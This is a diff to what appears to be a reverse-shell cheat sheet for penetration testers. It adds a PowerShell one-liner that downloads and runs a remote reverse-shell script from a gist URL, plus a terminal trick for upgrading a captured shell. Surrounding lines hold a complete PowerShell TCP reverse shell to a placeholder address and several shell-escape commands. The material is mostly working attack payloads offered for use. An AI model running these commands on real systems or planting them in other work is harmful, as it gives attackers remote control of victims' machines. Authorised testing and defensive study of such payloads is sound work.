@@ -72,6 +72,10 @@ Powershell
 powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("[IPADDR]",[PORT]);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 ```
 
+```powershell
+powershell IEX (New-Object Net.WebClient).DownloadString('https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1')
+```
+
 Java
 ```java
 r = Runtime.getRuntime()
@@ -109,6 +113,14 @@ ruby: exec "/bin/sh"
 lua: os.execute('/bin/sh')
 ```
 
+Access shortcuts, su, nano and autocomplete in a partially tty shell
+```
+ctrl+z
+stty raw -echo
+fg
+```
+/!\ OhMyZSH might break this trick
+
 (From within vi)
 ```
 :!bash
@@ -124,3 +136,4 @@ lua: os.execute('/bin/sh')
 * [Reverse Bash Shell One Liner](https://security.stackexchange.com/questions/166643/reverse-bash-shell-one-liner)
 * [Pentest Monkey - Cheat Sheet Reverse shell](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
 * [Spawning a TTY Shell](http://netsec.ws/?p=337)
+* [Obtaining a fully interactive shell](https://forum.hackthebox.eu/discussion/142/obtaining-a-fully-interactive-shell)
